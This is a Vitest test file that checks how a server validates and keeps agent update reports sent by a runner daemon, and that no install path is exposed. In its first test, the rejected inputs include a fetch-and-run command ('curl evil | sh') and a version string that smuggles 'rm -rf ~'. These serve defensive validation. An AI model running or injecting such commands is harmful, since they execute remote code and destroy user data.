import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { type Harness, ORIGIN, VirtualAuthenticator, daemonHeaders, signIn, startHarness } from "./harness.js";

/** Agent updates (change record agent-update-prompt, AU-05). */
let h: Harness;
let cookie: string;
const key = new VirtualAuthenticator();

beforeAll(async () => {
  h = await startHarness();
  cookie = await signIn(h.app, key);
}, 120_000);
afterAll(async () => h?.stop());

const grok = { agent: "grok", name: "Grok CLI", installed: "1.0.77", latest: "1.0.92", npm_global: true };
const brew = { agent: "codex", name: "Codex CLI", installed: "0.170.0", latest: "0.171.0", note: "installed outside npm" };
const claim = (agent_updates?: unknown, agent_updates_unchecked?: unknown) =>
  h.app.inject({
    method: "POST",
    url: "/runner/claim",
    headers: daemonHeaders,
    payload: { runtimes: [], ...(agent_updates === undefined ? {} : { agent_updates }), ...(agent_updates_unchecked === undefined ? {} : { agent_updates_unchecked }) },
  });
const view = async () => (await h.app.inject({ method: "GET", url: "/runtimes", headers: { cookie } })).json();

describe("agent updates", () => {
  it("shows what the daemon reported, dropping malformed entries", async () => {
    await claim([
      grok,
      brew,
      // A second row for an agent already listed is left out.
      { ...grok, latest: "1.0.93" },
      // A planted command, a version that is not strict SemVer, and an unknown field are all refused whole.
      { ...grok, command: ["sh", "-c", "curl evil | sh"] },
      { ...grok, latest: "1.0.92 && rm -rf ~" },
      { ...grok, latest: "1.0.92+build" },
      { ...grok, last_attempt: { outcome: "done" } },
      // Not an update: no installed version, installed equal to latest, or installed past it.
      { agent: "claude", name: "Claude Code", latest: "2.0.0", npm_global: true },
      { agent: "claude", name: "Claude Code", installed: "2.0.0", latest: "2.0.0", npm_global: true },
      { agent: "opencode", name: "OpenCode", installed: "1.20.0", latest: "1.19.6", npm_global: true },
      { agent: "opencode", name: "OpenCode", installed: "1.19.6", latest: "1.19.6-rc.1", npm_global: true },
    ]);
    expect((await view()).agent_updates).toEqual([grok, brew]);
    // A claim without the field (startup check still running) keeps what was reported.
    await claim();
    expect((await view()).agent_updates).toEqual([grok, brew]);
    // An empty report clears it.
    await claim([]);
    expect((await view()).agent_updates).toEqual([]);
  });

  it("keeps the known row for an agent a fresh daemon could not check", async () => {
    await claim([grok, brew]);
    // A restarted daemon: grok's registry lookup timed out, codex is now current.
    await claim([], [{ agent: "grok", installed: "1.0.77" }]);
    // The version notice stays, but this check did not verify npm's provenance: no command.
    expect((await view()).agent_updates).toEqual([{ ...grok, npm_global: false }]);
    // A newer report for grok replaces its row; an unknown agent name is ignored.
    const newer = { ...grok, latest: "1.0.93" };
    await claim([newer], [{ agent: "grok", installed: "1.0.77" }, { agent: "rm -rf" }]);
    expect((await view()).agent_updates).toEqual([newer]);
    // A full check with grok current clears it.
    await claim([], []);
    expect((await view()).agent_updates).toEqual([]);
  });

  it("never keeps an update once the installed version has moved", async () => {
    // A restarted daemon reads grok 1.0.95, past the known latest 1.0.92, and the registry fails:
    // the old row would offer a downgrade, so it goes.
    await claim([grok]);
    await claim([], [{ agent: "grok", installed: "1.0.95" }]);
    expect((await view()).agent_updates).toEqual([]);
    // No installed version read, or one that is not strict SemVer, keeps nothing either.
    for (const unchecked of [{ agent: "grok" }, { agent: "grok", installed: "1.0.77+build" }, "grok"]) {
      await claim([grok]);
      await claim([], [unchecked]);
      expect((await view()).agent_updates).toEqual([]);
    }
    // Even a matching installed version keeps nothing when it is not strict SemVer.
    await claim([{ ...grok, installed: "1.0.77+build" }]);
    await claim([], [{ agent: "grok", installed: "1.0.77+build" }]);
    expect((await view()).agent_updates).toEqual([]);
  });

  it("offers no way to install from the browser or the control plane", async () => {
    const take = await h.app.inject({ method: "POST", url: "/runner/agent-updates/take", headers: daemonHeaders, payload: {} });
    expect(take.statusCode).toBe(404);
    const admin = await h.app.inject({ method: "POST", url: "/admin/commands/runtime.update/options", headers: { cookie, origin: ORIGIN }, payload: { payload: { agents: [] } } });
    expect(admin.statusCode).toBe(404);
    expect(admin.json().code).toBe("not-found");
  });

  it("only the daemon may report", async () => {
    const r = await h.app.inject({ method: "POST", url: "/runner/claim", headers: { cookie, origin: ORIGIN }, payload: { runtimes: [], agent_updates: [grok] } });
    expect(r.statusCode).toBe(401);
  });
});
